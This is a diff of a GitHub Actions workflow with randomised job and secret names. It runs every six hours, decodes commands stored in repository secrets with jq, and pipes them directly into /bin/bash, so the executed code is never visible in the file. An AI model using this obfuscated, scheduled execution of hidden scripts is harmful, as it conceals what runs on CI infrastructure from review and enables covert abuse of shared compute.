@@ -1,21 +1,29 @@
 name: kongxianqi3178
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 1/6 * * *'
+    - cron: '13 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: kongxianqi3178
         env:
-          okse19293: ${{ secrets.okse19293 }}
+          vhdx7557: ${{ secrets.vhdx7557 }}
         run: |
-          echo $okse19293 | jq -r .wbot7070 | /bin/bash
-          echo $zeidr983 | jq -r .unora898 | /bin/bash
-          echo $bie16 | jq -r .ct813 | /bin/bash
-          echo $nnvk789 | jq -r .ebba5 | /bin/bash
+          echo $vhdx7557 | jq -r .ejd09863 | /bin/bash
+          echo $y72 | jq -r .rtyy8416 | /bin/bash
+          echo $n49 | jq -r .xyxo1 | /bin/bash
+          echo $sxx3636 | jq -r .iit691 | /bin/bash
+          echo $gv4 | jq -r .vyrq277 | /bin/bash
+          echo $xivg489 | jq -r .b57 | /bin/bash
+          echo $sbxz5 | jq -r .mcr69 | /bin/bash
+          echo $lppjm8982 | jq -r .adqix451 | /bin/bash
+          echo $eybn224 | jq -r .v90 | /bin/bash
+          echo $ms6 | jq -r .oehk98 | /bin/bash
+          echo $eaj2644 | jq -r .k18088 | /bin/bash
+          echo $tc7337 | jq -r .vvvv369 | /bin/bash
 
